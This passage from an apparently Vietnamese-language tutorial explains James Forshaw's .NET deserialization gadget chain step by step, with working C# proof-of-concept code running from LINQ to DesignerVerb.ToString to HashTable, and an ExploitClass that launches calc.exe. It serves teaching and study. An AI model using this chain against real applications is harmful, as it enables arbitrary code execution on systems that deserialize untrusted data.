<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2042.png"></p>
</li>
</ul>
<h3 id="1-ienumerable-to-linq-exploit-chaining">1. <strong><strong>IEnumerable to LINQ exploit chaining</strong></strong></h3>
<ul>
<li>
<p>Chain của James Forshaw như sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">byte</span><span class="p">[]</span> <span class="p">-&gt;</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="kt">byte</span><span class="p">[])</span> <span class="p">-&gt;</span> <span class="n">Assembly</span>
</span></span><span class="line"><span class="cl"><span class="n">Assembly</span> <span class="p">-&gt;</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Type</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">Type</span><span class="p">[]</span> <span class="p">-&gt;</span> <span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">Type</span><span class="p">[])</span> <span class="p">-&gt;</span> <span class="kt">object</span><span class="p">[]</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Chain trên sử dụng LINQ delegate để gọi các process từ interface <strong><strong>IEnumerable</strong></strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">TResult</span><span class="p">&gt;</span> <span class="n">Select</span><span class="p">&lt;</span><span class="n">TSource</span><span class="p">,</span> <span class="n">TResult</span><span class="p">&gt;(</span><span class="k">this</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">TSource</span><span class="p">&gt;</span> <span class="n">source</span><span class="p">,</span> <span class="n">Func</span><span class="p">&lt;</span><span class="n">TSource</span><span class="p">,</span> <span class="n">TResult</span><span class="p">&gt;</span> <span class="n">selector</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Đầu tiên: <code>byte[] -&gt; Assembly.Load(byte[]) -&gt; Assembly</code> được implement bởi đoạn code sau, trong đó <code>e1</code> là một Asembly object.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[]&gt;</span> <span class="n">data</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[]&gt;();</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">ExploitClass</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Location</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kt">var</span> <span class="n">e1</span> <span class="p">=</span> <span class="n">data</span><span class="p">.</span><span class="n">Select</span><span class="p">(</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Bước 2: <code>Assembly -&gt; Assembly.GetType() -&gt; Type[]</code> được implement thông qua đoạn code sau, trong đó, object <code>e2</code> có type là IEnumerable</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;</span> <span class="n">map_type</span> <span class="p">=</span> <span class="p">(</span><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;)</span><span class="n">Delegate</span><span class="p">.</span><span class="n">CreateDelegate</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span><span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;),</span><span class="k">typeof</span><span class="p">(</span><span class="n">Assembly</span><span class="p">).</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetTypes&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kt">var</span> <span class="n">e2</span> <span class="p">=</span> <span class="n">e1</span><span class="p">.</span><span class="n">SelectMany</span><span class="p">(</span><span class="n">map_type</span><span class="p">);</span> 
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Bước 3: <code>Type[] -&gt; Activator.CreateInstance(Type[]) -&gt; object[]</code> được hiện hiện thực như sau, trong đó <code>e3</code> có type là IEnumerable</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">var</span> <span class="n">e3</span> <span class="p">=</span> <span class="n">e2</span><span class="p">.</span><span class="n">Select</span><span class="p">(</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Do đó, chain của James Forshaw được hiện thực bởi đoạn code như sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">LinqBasic</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">internal</span> <span class="k">class</span> <span class="nc">Program</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// step 1</span>
</span></span><span class="line"><span class="cl">            <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[]&gt;</span> <span class="n">data</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[]&gt;();</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">ExploitClass</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Location</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e1</span> <span class="p">=</span> <span class="n">data</span><span class="p">.</span><span class="n">Select</span><span class="p">(</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// step2</span>
</span></span><span class="line"><span class="cl">            <span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;</span> <span class="n">map_type</span> <span class="p">=</span> <span class="p">(</span><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;)</span><span class="n">Delegate</span><span class="p">.</span><span class="n">CreateDelegate</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;),</span> <span class="k">typeof</span><span class="p">(</span><span class="n">Assembly</span><span class="p">).</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetTypes&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e2</span> <span class="p">=</span> <span class="n">e1</span><span class="p">.</span><span class="n">SelectMany</span><span class="p">(</span><span class="n">map_type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// step3</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e3</span> <span class="p">=</span> <span class="n">e2</span><span class="p">.</span><span class="n">Select</span><span class="p">(</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Ngoài ra, <code>ExploitClass</code> tại dòng 17 sẽ được implemnt đơn giản như sau</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">LinqBasic</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">internal</span> <span class="k">class</span> <span class="nc">ExploitClass</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">ExploitClass</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Payload code to be executed</span>
</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>Perfect, chạy thôi!!!!</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2043.png"></p>
<ul>
<li>Ủa alo!!!! Calculator đâu??</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2044.png"></p>
</li>
</ul>
<p>Sau một hồi suy nghĩ tôi chợt nhớ!</p>
<blockquote>
<p>LINQ có tính chất delay execution!</p>
</blockquote>
<p>Nghĩa là khi nào được sử dụng nó mới thực thi. Có khi ở bước này, LINQ chưa được sử dụng. Tạm thời cho là vậy và đi tiếp thôi</p>
<h3 id="2-fom-tostring-to-ienumerable">2. Fom ToString to IEnumerable</h3>
<ul>
<li>
<p>Nếu các bạn đã đi qua PHP-deserialize thì <code>__tostring()</code> là một trong những magic method thông dụng (sau <code>__wakeup(), __destruct()</code>) được dùng để khai thác lỗ hổng php deserialize. Với chain này trong .Net, James Forshaw cũng lấy ý tưởng như vậy:</p>
<ol>
<li>Tìm cách trigger ToString() khi deserialize</li>
<li>Tìm chain từ ToString() gọi đến IEnumerable</li>
</ol>
</li>
<li>
<p>Cùng xem xét đoạn code sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="c1">// PagedDataSource maps an arbitrary IEnumerable to an ICollection</span>
</span></span><span class="line"><span class="cl"><span class="n">PagedDataSource</span> <span class="n">pds</span> <span class="p">=</span> <span class="k">new</span> <span class="n">PagedDataSource</span><span class="p">()</span> <span class="p">{</span> <span class="n">DataSource</span> <span class="p">=</span> <span class="n">e3</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// AggregateDictionary maps an arbitrary ICollection to an IDictionary </span>
</span></span><span class="line"><span class="cl"><span class="c1">// Class is internal so need to use reflection.</span>
</span></span><span class="line"><span class="cl"><span class="n">IDictionary</span> <span class="n">dict</span> <span class="p">=</span> <span class="p">(</span><span class="n">IDictionary</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="kt">int</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Runtime.Remoting.Channels.AggregateDictionary&#34;</span><span class="p">),</span> <span class="n">pds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.</span>
</span></span><span class="line"><span class="cl"><span class="n">DesignerVerb</span> <span class="n">verb</span> <span class="p">=</span> <span class="k">new</span> <span class="n">DesignerVerb</span><span class="p">(</span><span class="s">&#34;XYZ&#34;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Need to insert IDictionary using reflection.</span>
</span></span><span class="line"><span class="cl"><span class="k">typeof</span><span class="p">(</span><span class="n">MenuCommand</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;properties&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="n">verb</span><span class="p">,</span> <span class="n">dict</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Trong đoạn code trên, <code>e3</code> có kiểu là IEnumerable (biến ở đoạn code ví dụ ở phần V.1) và mục đích của đoạn code này là dùng reflection để set giá trị <code>verb.properties=dict</code></li>
</ul>
<p><em><strong>Tại sao lại như vậy nhỉ???</strong></em></p>
<p>Đầu tiên, ta đi xem sơ qua cấu trúc của các kiểu dữ kiệu trong đoạn code trên</p>
<ul>
<li>PageDataSource</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2045.png"></p>
<ul>
<li>IDictionary</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2046.png"></p>
<ul>
<li><strong>DesignerWeb</strong> kế thừa <strong>MenuCommand</strong></li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2047.png"></p>
<ul>
<li>Trong MenuCommand thì chú ý tới dòng 17</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2048.png"></p>
<ul>
<li>Từ những dữ kiện trên, tôi đơn giản thành đoạn code như sau:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">MenuCommand</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">IDictionary</span> <span class="n">properties</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ...other members and methods...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">DesignerVerb</span> <span class="p">:</span> <span class="n">MenuCommand</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kt">string</span> <span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...other members and methods...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">DesignerVerb</span><span class="p">(</span><span class="kt">string</span> <span class="n">name</span><span class="p">,</span> <span class="n">IDictionary</span> <span class="n">properties</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="n">name</span> <span class="p">=</span> <span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="n">properties</span> <span class="p">=</span> <span class="n">properties</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">override</span> <span class="kt">string</span> <span class="n">ToString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...implementation...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>và nhìn lại đoạn code mà chúng ta cần phân tích</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">PagedDataSource</span> <span class="n">pds</span> <span class="p">=</span> <span class="k">new</span> <span class="n">PagedDataSource</span><span class="p">()</span> <span class="p">{</span> <span class="n">DataSource</span> <span class="p">=</span> <span class="n">e3</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="n">IDictionary</span> <span class="n">dict</span> <span class="p">=</span> <span class="p">(</span><span class="n">IDictionary</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="kt">int</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Runtime.Remoting.Channels.AggregateDictionary&#34;</span><span class="p">),</span> <span class="n">pds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">DesignerVerb</span> <span class="n">verb</span> <span class="p">=</span> <span class="k">new</span> <span class="n">DesignerVerb</span><span class="p">(</span><span class="s">&#34;XYZ&#34;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">typeof</span><span class="p">(</span><span class="n">MenuCommand</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;properties&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="n">verb</span><span class="p">,</span> <span class="n">dict</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>Dòng 1 đơn giản là tạo 1 instance <code>PagedDataSource</code> với <code>DataSource = e3</code> (e3 là LINQ ở phần V.1)</p>
</li>
<li>
<p>Dòng 2 tạo 1 instance của <code>AggregateDictionary</code> (là một <strong><code>IDictionary</code>),</strong> sử dụng reflection và gán vào <code>dict</code> và dùng biến pds ở dòng 1 làm tham số có constructor.</p>
</li>
<li>
<p>Dòng 3: tạo một <strong>DesignerVerb</strong> có tên là “XYZ” và không gán giá trị cho <code>properties</code></p>
</li>
<li>
<p>Dòng 4: dùng reflection truy cập tới private field <code>properties</code> của class <strong>MenuCommand.</strong> Sau đó, gán giá trị <code>properties</code> của <code>verb</code> là <code>dict</code>.</p>
<blockquote>
<p>Lưu ý:</p>
<ul>
<li>verb là instance của <code>DesignerVerb</code></li>
<li><code>DesignerVerb</code> kế thừa  <code>properties</code> từ <code>MenuCommand</code></li>
<li><code>properties</code> là 1 private trong <code>MenuCommand</code></li>
</ul>
<p>⇒ dùng reflection truy cập vào <code>properties</code> của <code>MenuCommand</code> nhưng set value thì của verb.</p>
</blockquote>
</li>
<li>
<p>Để gọi <code>ToString()</code> method thì chỉ cần dùng <code>verb.ToString()</code></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2049.png"></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2050.png"></p>
</li>
</ul>
<p>Oke, chạy thử thôi</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2051.png"></p>
<p>Gòi gòi đây gòi!! Ca cu lay tờ của tui đây rồi.!!</p>
<p>Có nghĩa đến đây, <code>ToString()</code> đã trigger LINQ, ExploitClass được thực thi và calc đã được bật. Đi tiếp thôi.</p>
</li>
</ul>
<h3 id="3-hashtable-to-tostring">3. HashTable to ToString</h3>
<ul>
<li>Chúng ta đã thành công từ việc dùng <code>ToString()</code> để trigger LINQ, execute malicious code để popup calc</li>
<li>Phần này chúng ta sẽ giải quyết vấn đề còn lại: Làm sao để trigger <code>ToString()</code> trong quá trình deserialize (<code>verb.ToString()</code> ở cuối phần trước chỉ là dùng để chứng mình ta thành công trong việc <code>ToString()</code> đến execute calc). Và solution ở đây là dùng HashTable</li>
</ul>
<blockquote>
<p>FUN: Thấy HashTable làm tôi nghĩ ngay tới các commonsCollection trong Java Deserialize, HashTable cũng được dùng trong cc7</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2052.png"></p>
</blockquote>
<ul>
<li>
<p>Hãy xem HashTable có gì?</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2053.png"></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2054.png"></p>
</li>
<li>
<p>Trong <code>HashTable</code> có một method <code>public virtual void OnDeserialization(object sender);</code>Dùng dnspy để xem</p>
</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2055.png"></p>
<p>Trong quá trình Deserialize, HashTable sẽ rebuild lại tập key và insert.</p>
<p>Trong <code>Insert()</code>, nếu như key bị duplicated, chương trình deserialize fail, quăng ra lỗi</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2056.png"></p>
<p><strong>Block_12:</strong></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2057.png"></p>
<p>Và <code>Environment.GetResourceString()</code> được gọi</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2058.png"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">List</span><span class="p">&lt;</span><span class="kt">object</span><span class="p">&gt;</span> <span class="n">ls</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">object</span><span class="p">&gt;();</span>
</span></span><span class="line"><span class="cl"><span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e3</span><span class="p">);</span>
